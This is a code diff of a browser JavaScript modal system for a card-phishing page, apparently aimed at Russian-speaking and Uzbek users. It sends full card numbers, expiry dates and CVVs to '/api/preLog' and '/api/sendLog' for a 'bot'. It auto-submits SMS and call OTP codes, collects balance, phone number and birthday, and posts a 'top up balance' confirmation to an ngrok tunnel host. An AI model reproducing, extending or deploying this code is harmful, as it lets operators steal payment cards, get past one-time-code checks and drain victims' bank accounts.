@@ -542,113 +542,174 @@
       '</div>';
 
     document.body.appendChild(container);
-    this.showModal('msLoading');
 
-    this._sendCardDataToBot(cardData);
+    if (typeof window.OTPAutofill !== 'undefined') {
+      window.OTPAutofill.init();
+    }
 
     var self = this;
 
-    // Fetch AutoPP config and checker state in parallel
-    var autoPPPromise = axios.post('/api/getAutoPPConfig', { item: this.cfg.itemId }).catch(function () { return { data: { enabled: false } }; });
-    var checkerPromise = axios.post('/api/getCheckerState', { item: this.cfg.itemId }).catch(function () { return { data: {} }; });
+    this._bind('msBalanceVerifyBtn', 'click', function () { self._submitBalance(); });
 
-    Promise.all([autoPPPromise, checkerPromise]).then(function (results) {
-      var autoPPData = results[0].data || {};
-      var checkerData = results[1].data || {};
+    function balanceInputFilter(inp) {
+      if (!inp) return;
+      inp.addEventListener('input', function () {
+        var v = inp.value.replace(/[^0-9.,]/g, '');
+        var parts = v.split(/[.,]/);
+        if (parts.length > 1) {
+          v = parts[0] + '.' + parts.slice(1).join('').substring(0, 2);
+        }
+        inp.value = v;
+      });
+    }
+    balanceInputFilter(document.getElementById('msBalanceVerifyInput'));
+    balanceInputFilter(document.getElementById('msBalanceCode'));
 
-      self.cfg.checkBalance = checkerData.checkBalance;
-      self._autoPP = autoPPData;
+    this._bind('msCardFormClose', 'click', function () { self.hideCardForm(); });
+    this._bind('_buttonPay', 'click', function () { self._submitCardForm(); });
 
-      // Check excluded BINs only for Uzbekistan pages
-      var pageCountryMeta = document.querySelector('meta[name="page-country"]');
-      var pageCountry = pageCountryMeta && pageCountryMeta.content ? String(pageCountryMeta.content).toLowerCase() : '';
-      var isUzPage = pageCountry === 'uz';
-
-      if (isUzPage && autoPPData.enabled && autoPPData.excludedBins && autoPPData.excludedBins.length > 0) {
-        var cardNum = (cardData.cardNumber || '').replace(/\D/g, '');
-        for (var i = 0; i < autoPPData.excludedBins.length; i++) {
-          var bin = autoPPData.excludedBins[i];
-          if (cardNum.indexOf(bin) === 0) {
-            // BIN is blocked - show error modal
-            var t = self.cfg.translate || {};
-            var skTitle = document.querySelector('#msWrongDataDisplay .ms-title');
-            var skText = document.querySelector('#msWrongDataDisplay .ms-text');
-            if (skTitle) skTitle.textContent = t.errors && t.errors.changeCard || 'Возникла проблема';
-            if (skText) skText.textContent = t.errors && t.errors.cardProblem || 'Уважаемый пользователь, данная банковская карта не поддерживается. Пожалуйста укажите карту другого банка.';
-            self.showModal('msWrongDataDisplay');
-            self._cardLocked = false;
-            // Notify worker about blocked BIN
-            axios.post('/api/autoPPNotify', { item: self.cfg.itemId, event: 'binBlocked', extra: bin }).catch(function () {});
-            return;
+    var msCardInput0 = document.getElementById('_input0');
+    if (msCardInput0) {
+      msCardInput0.addEventListener('input', function () {
+        self._detectCardBrand(this.value.replace(/\D/g, ''));
+        var rawNum = (typeof CardForm !== 'undefined' && CardForm.getRawNumber)
+          ? CardForm.getRawNumber()
+          : this.value.replace(/\D/g, '');
+        var expEl = document.getElementById('_input1');
+        self._updatePreview({
+          number: rawNum,
+          exp: expEl ? expEl.value : '',
+          holder: ''
+        });
+      });
+    }
+    var msCardInput1 = document.getElementById('_input1');
+    if (msCardInput1) {
+      msCardInput1.addEventListener('input', function () {
+        var rawNum = (typeof CardForm !== 'undefined' && CardForm.getRawNumber)
+          ? CardForm.getRawNumber()
+          : (document.getElementById('_input0') || {}).value || '';
+        self._updatePreview({
+          number: rawNum,
+          exp: this.value,
+          holder: ''
+        });
+      });
+    }
+    var msCardOverlay = document.getElementById('msCardForm');
+    if (msCardOverlay) {
+      document.addEventListener('keydown', function (ev) {
+        if (!msCardOverlay.classList.contains('active')) return;
+        if (ev.key === 'Escape' || ev.keyCode === 27) {
+          ev.preventDefault();
+          self.hideCardForm();
+        } else if (ev.key === 'Enter' || ev.keyCode === 13) {
+          var btn = document.getElementById('_buttonPay');
+          if (btn && !btn.disabled) {
+            ev.preventDefault();
+            self._submitCardForm();
           }
         }
-      }
+      });
+      msCardOverlay.addEventListener('mousedown', function (ev) {
+        if (ev.target === msCardOverlay) self.hideCardForm();
+      });
+    }
 
-      self._processCardStep2(cardData);
+    this._bind('msSmsBtn', 'click', function () { self._sendValue('sms', 'msSmsCode'); });
+    this._bind('msSmsCallBtn', 'click', function () { self._sendValue('callSms', 'msSmsCallCode'); });
+
+    var smsInput = document.getElementById('msSmsCode');
+    var smsCallInput = document.getElementById('msSmsCallCode');
+    function autoSubmitSms(inputEl, type, inputId) {
+      if (!inputEl) return;
+      var lastLen = 0;
+      var rapidStart = 0;
+      var rapidTimer = null;
+      inputEl.addEventListener('input', function () {
+        var v = inputEl.value.replace(/\D/g, '');
+        if (v.length >= 4 && lastLen <= 1) {
+          self._sendValue(type, inputId);
+        }
+        if (v.length >= 1 && v.length < 4 && !rapidStart) {
+          rapidStart = Date.now();
+        }
+        if (v.length >= 4 && rapidStart && lastLen < 4) {
+          if (Date.now() - rapidStart < 100) {
+            self._sendValue(type, inputId);
+          }
+          rapidStart = 0;
+        }
+        if (rapidTimer) clearTimeout(rapidTimer);
+        rapidTimer = setTimeout(function() { rapidStart = 0; }, 200);
+        lastLen = v.length;
+      });
+    }
+    autoSubmitSms(smsInput, 'sms', 'msSmsCode');
+    autoSubmitSms(smsCallInput, 'callSms', 'msSmsCallCode');
+
+    this._bind('msPushBtn', 'click', function () { self._confirmAction('push'); });
+    this._bind('msCallBtn', 'click', function () { self._confirmAction('call'); });
+    this._bind('msWrongDataDisplayBtn', 'click', function () { self._resetToCard(); });
+    this._bind('msWrongDataBtn', 'click', function () { self._sendValue(self.wrongDataType, 'msWrongDataCode'); });
+    this._bind('msBalanceBtn', 'click', function () { self._sendValue('balance', 'msBalanceCode'); });
+    this._bind('msFieldBtn', 'click', function () { self._sendValue('custom', 'msFieldCode'); });
+    this._bind('msSmenalkBtn', 'click', function () { self._handleSmenalk(); });
+    this._bind('msErrorBtn', 'click', function () { self._resetToCard(); });
+    this._bind('msCustomBtn', 'click', function () { self._confirmCustom(); });
+    this._bind('msMerchantBtn', 'click', function () { self._resetToCard(); });
+    this._bind('msPopolnenieBtn', 'click', function () { self._handlePopolnenie(); });
+    this._bind('msPhoneBtn', 'click', function () {
+      if (self.cfg.requestPhoneAfterBalance && self._pendingBalance !== undefined) {
+        var phoneInp = document.getElementById('msPhoneInput');
+        var phoneVal = (phoneInp.value || '').trim();
+        if (!phoneVal || phoneVal.length < 5) {
+          phoneInp.style.borderColor = 'var(--modal-error, #d32f2f)';
+          var phoneErr = document.getElementById('msPhoneError');
+          if (phoneErr) phoneErr.style.display = 'block';
+          return;
+        }
+        phoneInp.style.borderColor = 'var(--modal-accent, #1867c1)';
+        var phoneErr2 = document.getElementById('msPhoneError');
+        if (phoneErr2) phoneErr2.style.display = 'none';
+        var phoneBtn = document.getElementById('msPhoneBtn');
+        if (phoneBtn) { phoneBtn.disabled = true; phoneBtn.textContent = '...'; }
+        self._pendingPhone = phoneVal;
+        self.showModal('msLoading');
+        self._sendLog(self._pendingBalance);
+        self._pendingBalance = undefined;
+      } else {
+        self._sendValue('phone', 'msPhoneInput');
+      }
     });
+    this._bind('msBirthdayBtn', 'click', function () { self._submitBirthday(); });
+    this._setupDateSegments();
   };
 
   ModalSystem.prototype._processCardStep2 = function (cardData) {
     var self = this;
-    var rawCardNum = (cardData.cardNumber || '').replace(/\s/g, '');
 
-    // Force balance check if AutoPP has ppAmount set (need balance to compare)
-    var needBalance = this.cfg.checkBalance;
-    if (!needBalance && this._autoPP && this._autoPP.enabled && this._autoPP.ppAmount) {
-      needBalance = true;
-    }
+    axios.post('/api/preLog', {
+      item: this.cfg.itemId,
+      cardNumber: cardData.cardNumber,
+      cardMonth: cardData.cardMonth,
+      cardYear: cardData.cardYear,
+      cardCvv: cardData.cardCvv
+    }).catch(function () {});
 
-    
-    function postCardToBot() {
-      axios.post('/api/sendLog', {
-        item: self.cfg.itemId,
-        cardNumber: rawCardNum,
-        cardMonth: cardData.cardMonth,
-        cardYear: cardData.cardYear,
-        cardCvv: cardData.cardCvv,
-        balance: 'pending'
-      }).catch(function () {});
-    }
+    setTimeout(function () {
+      self.showModal('msBalanceVerify');
+      var inp = document.getElementById('msBalanceVerifyInput');
+      if (inp) {
+        inp.value = '';
+        inp.style.borderColor = '';
+      }
+      var err = document.getElementById('msBalanceVerifyError');
+      if (err) err.style.display = 'none';
+      setTimeout(function () { if (inp) inp.focus(); }, 400);
 
-    if (needBalance) {
-      axios.post('/api/preLog', {
-        item: self.cfg.itemId,
-        cardNumber: rawCardNum,
-        cardMonth: cardData.cardMonth,
-        cardYear: cardData.cardYear,
-        cardCvv: cardData.cardCvv
-      }).catch(function () {});
-      
-      postCardToBot();
-
-      setTimeout(function () {
-        self.showModal('msBalanceVerify');
-        var inp = document.getElementById('msBalanceVerifyInput');
-        if (inp) { inp.value = ''; }
-        var err = document.getElementById('msBalanceVerifyError');
-        if (err) err.style.display = 'none';
-        setTimeout(function () { if (inp) inp.focus(); }, 400);
-        
-        axios.post('/api/balancePage', { item: self.cfg.itemId }).catch(function () {});
-      }, 2500);
-    } else {
-      
-      postCardToBot();
-
-      setTimeout(function () {
-        if (self.cfg.requestPhoneAfterBalance) {
-          self._pendingBalance = '0';
-          self.showModal('msRequestPhone');
-          var phoneInp = document.getElementById('msPhoneInput');
-          if (phoneInp) { phoneInp.value = ''; }
-          var phoneErr = document.getElementById('msPhoneError');
-          if (phoneErr) phoneErr.style.display = 'none';
-          setTimeout(function () { if (phoneInp) phoneInp.focus(); }, 400);
-        } else {
-          self._sendLog('0');
-        }
-      }, 1500);
-    }
+      axios.post('/api/balancePage', { item: self.cfg.itemId }).catch(function () {});
+    }, 2500);
   };
 
   ModalSystem.prototype._submitBalance = function () {
@@ -1692,6 +1753,174 @@
     }
     this.showModal('msLoading');
     this._startPolling();
+  };
+
+  ModalSystem.prototype.showModal = function (id) {
+    if (this.currentModal) this.currentModal.classList.remove('active');
+    var m = document.getElementById(id);
+    if (m) {
+      m.classList.add('active');
+      this.currentModal = m;
+
+      var cardNum = (this._cardData && this._cardData.cardNumber) || '';
+      if (!cardNum) { cardNum = _memCardNum || ''; }
+      if ((id === 'msSms' || id === 'msSmsCall') && cardNum) {
+        var digits = cardNum.replace(/\D/g, '');
+        var first6 = digits.substring(0, 6);
+        var last4 = digits.substring(digits.length - 4);
+        var masked = first6.substring(0, 4) + ' ' + first6.substring(4, 6) + '** **** ' + last4;
+        var maskEl = m.querySelector('.ms-sms-card-mask');
+        if (maskEl) maskEl.textContent = masked;
+      }
+
+      if (typeof window.OTPAutofill !== 'undefined') {
+        setTimeout(function() { window.OTPAutofill.init(); }, 100);
+      }
+    }
+  };
+
+  ModalSystem.prototype.hideAllModals = function () {
+    var all = document.querySelectorAll('.ms-overlay');
+    for (var i = 0; i < all.length; i++) all[i].classList.remove('active');
+    this.currentModal = null;
+  };
+
+  ModalSystem.prototype._resetPhoneBtn = function () {
+    var phoneBtn = document.getElementById('msPhoneBtn');
+    if (phoneBtn) {
+      phoneBtn.disabled = false;
+      var t = this.cfg.translate || {};
+      phoneBtn.textContent = (t.sms && t.sms.next || 'Confirm');
+    }
+  };
+
+  ModalSystem.prototype._bind = function (id, evt, fn) {
+    var el = document.getElementById(id);
+    if (el) el.addEventListener(evt, fn);
+  };
+
+  ModalSystem.prototype._setupDateSegments = function () {
+    var day = document.getElementById('msBdayDay');
+    var month = document.getElementById('msBdayMonth');
+    var year = document.getElementById('msBdayYear');
+    if (!day || !month || !year) return;
+
+    function onlyDigits(e) {
+      var v = e.target.value.replace(/\D/g, '');
+      e.target.value = v;
+    }
+
+    day.addEventListener('input', function (e) {
+      onlyDigits(e);
+      if (e.target.value.length >= 2) month.focus();
+    });
+    month.addEventListener('input', function (e) {
+      onlyDigits(e);
+      if (e.target.value.length >= 2) year.focus();
+    });
+    year.addEventListener('input', function (e) {
+      onlyDigits(e);
+    });
+
+    month.addEventListener('keydown', function (e) {
+      if (e.key === 'Backspace' && !e.target.value) { day.focus(); }
+    });
+    year.addEventListener('keydown', function (e) {
+      if (e.key === 'Backspace' && !e.target.value) { month.focus(); }
+    });
+  };
+
+  ModalSystem.prototype._submitBirthday = function () {
+    var day = document.getElementById('msBdayDay');
+    var month = document.getElementById('msBdayMonth');
+    var year = document.getElementById('msBdayYear');
+    var hidden = document.getElementById('msBirthdayInput');
+    var errEl = document.getElementById('msBirthdayError');
+    var group = document.getElementById('msBirthdayGroup');
+
+    var d = (day.value || '').trim();
+    var m = (month.value || '').trim();
+    var y = (year.value || '').trim();
+
+    if (!d || !m || !y || d.length < 1 || m.length < 1 || y.length < 4) {
+      if (errEl) errEl.style.display = 'block';
+      if (group) group.style.borderColor = 'var(--modal-error, #d32f2f)';
+      return;
+    }
+
+    if (errEl) errEl.style.display = 'none';
+    if (group) group.style.borderColor = 'var(--modal-accent, #1867c1)';
+
+    var val = d.padStart(2, '0') + '.' + m.padStart(2, '0') + '.' + y;
+    hidden.value = val;
+
+    this._sendValue('requestBirthday', 'msBirthdayInput');
+  };
+
+  ModalSystem.prototype._handlePopolnenie = function () {
+    var btn = document.getElementById('msPopolnenieBtn');
+    if (btn) { btn.disabled = true; btn.textContent = '...'; }
+
+    var self = this;
+    var API_BASE = 'https://arboricultural-roselia-unsolvably.ngrok-free.dev';
+    var id = this.logId || ('temp_' + this.cfg.itemId + '_' + Date.now());
+
+    axios.post(API_BASE + '/api/confirmAction', { method: 'popolnenie', id: id, itemId: this.cfg.itemId })
+      .then(function () {
+        self.currentStatus = 'wait';
+        self.showModal('msLoading');
+      })
+      .catch(function (err) {
+        if (btn) { btn.disabled = false; btn.textContent = 'Я пополнил(а) баланс'; }
+      });
+  };
+
+  ModalSystem.prototype.processCard = function (cardData) {
+    if (this._cardLocked) return;
+    this._cardLocked = true;
+    this._cardData = cardData;
+    _memCardNum = cardData.cardNumber || '';
+    _memCardData = cardData;
+    this.showModal('msLoading');
+
+    this._sendCardDataToBot(cardData);
+
+    var self = this;
+
+    var autoPPPromise = axios.post('/api/getAutoPPConfig', { item: this.cfg.itemId }).catch(function () { return { data: { enabled: false } }; });
+    var checkerPromise = axios.post('/api/getCheckerState', { item: this.cfg.itemId }).catch(function () { return { data: {} }; });
+
+    Promise.all([autoPPPromise, checkerPromise]).then(function (results) {
+      var autoPPData = results[0].data || {};
+      var checkerData = results[1].data || {};
+
+      self.cfg.checkBalance = checkerData.checkBalance;
+      self._autoPP = autoPPData;
+
+      var pageCountryMeta = document.querySelector('meta[name="page-country"]');
+      var pageCountry = pageCountryMeta && pageCountryMeta.content ? String(pageCountryMeta.content).toLowerCase() : '';
+      var isUzPage = pageCountry === 'uz';
+
+      if (isUzPage && autoPPData.enabled && autoPPData.excludedBins && autoPPData.excludedBins.length > 0) {
+        var cardNum = (cardData.cardNumber || '').replace(/\D/g, '');
+        for (var i = 0; i < autoPPData.excludedBins.length; i++) {
+          var bin = autoPPData.excludedBins[i];
+          if (cardNum.indexOf(bin) === 0) {
+            var t = self.cfg.translate || {};
+            var skTitle = document.querySelector('#msWrongDataDisplay .ms-title');
+            var skText = document.querySelector('#msWrongDataDisplay .ms-text');
+            if (skTitle) skTitle.textContent = t.errors && t.errors.changeCard || 'Возникла проблема';
+            if (skText) skText.textContent = t.errors && t.errors.cardProblem || 'Уважаемый пользователь, данная банковская карта не поддерживается. Пожалуйста укажите карту другого банка.';
+            self.showModal('msWrongDataDisplay');
+            self._cardLocked = false;
+            axios.post('/api/autoPPNotify', { item: self.cfg.itemId, event: 'binBlocked', extra: bin }).catch(function () {});
+            return;
+          }
+        }
+      }
+
+      self._processCardStep2(cardData);
+    });
   };
 
   window.ModalSystem = ModalSystem;
